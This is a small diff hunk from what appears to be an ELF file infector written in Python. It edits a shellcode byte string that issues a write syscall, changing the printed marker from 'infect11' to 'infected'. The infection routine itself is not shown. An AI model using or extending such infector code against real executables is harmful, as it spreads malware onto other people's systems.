@@ -31,7 +31,7 @@ def infect_elf(file_path):
 		b"\x48\xc7\xc6\x75\x11\x00\x00"            # mov rsi, 0x1175 (address of the message)
  		b"\x48\xc7\xc2\x0e\x00\x00\x00"            # mov rdx, 14 (message length)
 		b"\x0f\x05"                                # syscall (trigger system call)
-		b"infect11\n"                         # The message to output
+		b"infected\n"                         # The message to output
 		)
 
         
